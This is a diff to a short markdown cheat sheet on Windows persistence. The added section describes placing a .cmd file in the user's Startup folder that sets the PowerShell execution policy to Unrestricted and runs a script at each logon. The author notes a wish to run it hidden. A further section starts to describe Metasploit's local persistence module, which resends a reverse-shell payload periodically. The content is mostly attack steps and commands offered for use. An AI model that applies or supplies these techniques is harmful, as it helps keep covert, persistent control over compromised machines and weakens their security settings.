@@ -1,6 +1,16 @@
 # Persistence on Windows
 
 
+# Launch Commands at startup
+Create your .ps1 script and place it in a folder. I put it on my desktop for simplicity. The path would look something like this:
+    C:\Users\<user_name>\Desktop\script.ps1
+Create a .cmd file and place it in
+    C:\Users\<user_name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd
+Open the .cmd file with a text editor and enter the following lines:
+    PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 3>&1
+    PowerShell C:\Users\<user_name>\Desktop\script.ps1 >> "%TEMP%\StartupLog.txt" 2>&1
+!! I SHOULD FIND A WAY TO RUN THIS HIDDEN!!
+
 # Metasploit periodic reverse shell 
 use exploit/windows/local/persistence
 ;; this module will send a payload every 10 seconds in default however you can set this time to anything you want
